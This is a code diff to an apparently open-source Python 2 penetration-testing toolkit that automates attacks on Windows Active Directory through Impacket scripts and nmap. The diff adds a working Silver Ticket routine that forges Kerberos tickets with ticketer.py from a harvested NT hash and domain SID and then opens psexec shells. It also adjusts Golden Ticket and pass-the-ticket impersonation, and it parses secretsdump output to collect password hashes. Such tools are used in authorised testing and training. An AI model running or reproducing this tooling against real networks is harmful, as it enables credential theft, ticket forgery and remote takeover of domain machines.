@@ -261,11 +261,11 @@ def display():
 
 # ----------------------------------------------------------------------------------------------------------------------------------------------------
 
-   print u'\u2551' + "(0) Save/Exit          (10) Re/Set WIN COMMAND (20) Get Arch (30) Enum4Linux     (40) KerbMailAddress (50) Domain Dump  (60) FTP    " + u'\u2551'
-   print u'\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME  (21) Net View (31) WinDap Search  (41) Kerb Filter     (51) BloodHound   (61) SSH    " + u'\u2551'
+   print u'\u2551' + "(0) Save/Exit          (10) Re/Set WIN COMMAND (20) Get Arch (30) Enum4Linux     (40) Kerb Users Info (50) Domain Dump  (60) FTP    " + u'\u2551'
+   print u'\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME  (21) Net View (31) WinDap Search  (41) Kerb Filter     (51) Blood Hound  (61) SSH    " + u'\u2551'
    print u'\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY   (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) ACL Pawn     (62) TelNet " + u'\u2551'
-   print u'\u2551' + "(3) Re/Set USERNAME    (13) Check Connection   (23) AtExec   (33) SamDump Users  (43) Kerb Roasting   (53) Secrets Dump (63) NetCat " + u'\u2551'
-   print u'\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records  (24) DcomExec (34) RpcDump        (44) Kerb ASREPRoast (54) CrackMapExec (64) WinRem " + u'\u2551'
+   print u'\u2551' + "(3) Re/Set USERNAME    (13) Check Connection   (23) AtExec   (33) Sam Dump Users (43) Kerb Roasting   (53) Secrets Dump (63) NetCat " + u'\u2551'
+   print u'\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records  (24) DcomExec (34) Rpc Dump       (44) Kerb ASREPRoast (54) CrackMapExec (64) WinRem " + u'\u2551'
    print u'\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER   (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) WmiExec HASH (65)        " + u'\u2551'
    print u'\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew    (26) SmbExec  (36) Smb Client     (46) Pass the Hash   (56)              (66)        " + u'\u2551'
    print u'\u2551' + "(7) Re/Set DOMAIN SID  (17) Nmap Subdomains    (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57)              (67)        " + u'\u2551'
@@ -298,7 +298,7 @@ print "BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS\n"
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-print "Booting - Please wait...\n"
+print "[+] Booting - Please wait...\n"
 
 if not os.path.exists("WORKAREA"):		# DEFUALT WORKAREA
    os.mkdir("WORKAREA")
@@ -1035,7 +1035,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='32':
-      print "\nPLease wait....\n"
+      print "\n[+] Please wait....\n"
       os.system(PRO + "lookupsid.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> DOMAIN.tmp")
       command("cat DOMAIN.tmp")
       os.system("cat DOMAIN.tmp | grep 'Domain SID' >> SID.tmp")
@@ -1054,7 +1054,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='33':
-      print "\nPlease wait..."
+      print "\n[+] Please wait..."
       os.remove("USERS.tmp")	# CLEAR WORK FILE
       os.remove("users.txt")	# CLEAR WORK FILE
 
@@ -1076,7 +1076,7 @@ while True:
                os.system("echo " + US[x] + " >> users.txt")	# ASSIGN USERS NAME
             else:
                US[x] = "                                "	# ASSIGN EMPTY USERS
-            PA[x] = "................................";		# RESET PASSWORDS
+            PA[x] = "................................"		# RESET PASSWORDS
       
       if US[12] != "                                ":
          US[11] = "Some users are not shown!!..."
@@ -1171,7 +1171,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '41':
-      print "\nPlease wait...\n"
+      print "\n[+] Please wait...\n"
       os.system("nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=" + HST.rstrip(" ") + ",userdb=users.txt " + TIP.rstrip(" ") + " >> KUSERS.tmp")
       os.system("sed -i '/@/!d' KUSERS.tmp")
       os.system("sort KUSERS.tmp > USERS2.tmp")
@@ -1270,7 +1270,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '46':
-      print "\n[-] Trying user " + USR.rstrip(" ") + "...\n"
+      print "\n[+] Trying user " + USR.rstrip(" ") + "...\n"
       if PAS[:1] != "\"":
          os.system(PRO + "getTGT.py " + HST.rstrip(" ") +  "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
          os.system("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
@@ -1285,16 +1285,16 @@ while True:
       else:
           os.system("echo 'TGT was not generated...'")
 
-      print "\n[-] Trying user " + POR.rstrip(" ") + " (IMPERSONATE)...\n"
-      HASH = " "
+      print "\n[+] Trying user " + POR.rstrip(" ") + " (IMPERSONATE)...\n"
+      HASH = "................................"
       for x in range (0, MAX):
          if US[x].rstrip(" ") == POR.rstrip(" "):    # IMPERSONATE VALUE
             HASH = PA[x].rstrip(" ")                 # GET HASH
-      if HASH[:1] != " ":
+      if HASH[:1] != ".":
          os.system(PRO + "getTGT.py " + HST.rstrip(" ") +  "/" + POR.rstrip(" ") + " -hashes :" + HASH)
          os.system("export KRB5CCNAME=" + POR.rstrip(" ") + ".ccache")
          if os.path.exists(POR.rstrip(" ") + ".ccache"):
-            command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
+            command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + POR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
          else:
             command("echo 'TGT was not generated...'")
 
@@ -1313,13 +1313,35 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN -spn ? USER
+# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain DOMAIN -spn cifs/Forest
 # Details : Silver Ticket!! 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '48':
-      command("echo 'Silver Ticket has not been implemented yet...'")
+      print "\n[+] Trying user " + USR.rstrip(" ") + "...\n"
+      if (FRST[:1] != "") & (WGRP[:1] != ""):
+         os.system(PRO + "ticketer.py -nthash " + FRST.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " -spn cifs/" + DNSN.rstrip(" ") + " " + USR.rstrip(" "))
+         os.system("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
+      else:
+         os.system("echo 'Hash or Domain-SID not found...'")
+      if os.path.exists(USR.rstrip(" ") + ".ccache"):
+         os.system(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
+      else:
+          command("echo 'Golden TGT was not generated...'")
+      
+      print "\n[+] Trying user " + POR.rstrip(" ") + " (IMPERSONATE)...\n"
+      HASH = "................................"
+      for x in range (0, MAX):
+         if US[x].rstrip(" ") == POR.rstrip(" "):    # IMPERSONATE VALUE
+            HASH = PA[x].rstrip(" ")                 # GET HASH
+      if HASH[:1] != ".":
+         os.system(PRO + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " -spn cifs/" + DNSN.rstrip(" ") + " " + POR.rstrip(" "))
+         os.system("export KRB5CCNAME=" + POR.rstrip(" ") + ".ccache")
+      if os.path.exists(POR.rstrip(" ") + ".ccache"):
+         command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + POR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
+      else:
+         command("echo 'Golden TGT was not generated...'")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1330,24 +1352,23 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '49':
-      print "\n[-] Trying user " + USR.rstrip(" ") + "...\n"
+      print "\n[+] Trying user " + USR.rstrip(" ") + "...\n"
       if (FRST[:1] != "") & (WGRP[:1] != ""):
          os.system(PRO + "ticketer.py -nthash " + FRST.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " " + USR.rstrip(" "))
-         os.system("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
-         
+         os.system("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")       
       else:
          os.system("echo 'Hash or Domain-SID not found...'")
       if os.path.exists(USR.rstrip(" ") + ".ccache"):
          os.system(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
       else:
           command("echo 'Golden TGT was not generated...'")
-
-      print "\n[-] Trying user " + POR.rstrip(" ") + " (IMPERSONATE)...\n"
-      HASH = " "
+      
+      print "\n[+] Trying user " + POR.rstrip(" ") + " (IMPERSONATE)...\n"
+      HASH = "................................"
       for x in range (0, MAX):
          if US[x].rstrip(" ") == POR.rstrip(" "):    # IMPERSONATE VALUE
             HASH = PA[x].rstrip(" ")                 # GET HASH
-      if HASH[:1] != " ":
+      if HASH[:1] != ".":
          os.system(PRO + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " " + POR.rstrip(" "))
          os.system("export KRB5CCNAME=" + POR.rstrip(" ") + ".ccache")
       if os.path.exists(POR.rstrip(" ") + ".ccache"):
@@ -1399,7 +1420,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='53':
-      print "\nPlease wait...\n"
+      print "\n[+] Please wait...\n"
       os.remove("SECRETS.tmp")
       os.system(PRO + "secretsdump.py " + HST.rstrip(" ") + '/' + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> SECRETS.tmp")
       command("cat SECRETS.tmp")
@@ -1416,13 +1437,13 @@ while True:
          temp = HST.rstrip(" ") + "\\"
          data = data.replace(temp,"")
          get1,get2,get3,get4 = data.split(":")
-         get1 = padding(get1,COL3) 	# USER
-         get4 = padding(get4,COL4) 	# PASSWORD
+         get1 = padding(get1,COL3) 			# USER
+         get4 = padding(get4,COL4) 			# PASSWORD
 
          for y in range (0, MAX):
-            if US[y] == get1:		# MATCH USER
-               PA[y] = get4		# MATCH PASSWORD
-
+            if US[y] == get1:				# MATCH USER
+               PA[y] = get4				# MATCH PASSWORD
+ 
       for z in range(0, MAX):
          if US[z].rstrip(" ") == USR.rstrip(" "):	# CURRENT USER
             FRST = PA[z]				# DISPLAY HASH 
